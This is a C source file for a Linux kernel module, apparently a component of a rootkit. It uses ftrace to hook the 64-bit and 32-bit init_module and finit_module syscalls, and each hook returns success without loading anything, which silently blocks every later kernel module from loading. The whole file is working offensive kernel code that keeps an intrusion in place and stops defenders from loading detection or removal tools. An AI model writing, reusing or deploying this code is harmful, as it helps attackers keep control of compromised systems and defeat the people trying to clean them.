#include "../include/core.h"
#include "../include/hooking_insmod.h"
#include "../ftrace/ftrace_helper.h"

static asmlinkage long (*hooked_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_finit_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_init_module32)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_finit_module32)(struct file *file, const char *uargs, unsigned long flags);

static notrace asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static notrace asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static notrace asmlinkage long hook_init_module32(struct pt_regs *regs) {
    struct file *file = (struct file *)regs->bx;
    const char *uargs = (const char *)regs->cx;
    unsigned long flags = regs->dx;

    (void)file; (void)uargs; (void)flags;
    return 0;
}

static notrace asmlinkage long hook_finit_module32(struct pt_regs *regs) {
    struct file *file = (struct file *)regs->bx;
    const char *uargs = (const char *)regs->cx;
    unsigned long flags = regs->dx;

    (void)file; (void)uargs; (void)flags;
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &hooked_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &hooked_finit_module),
    HOOK("__ia32_sys_init_module", hook_init_module32, &hooked_init_module32),
    HOOK("__ia32_sys_finit_module", hook_finit_module32, &hooked_finit_module32),
};

notrace int hooking_insmod_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hooking_insmod_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
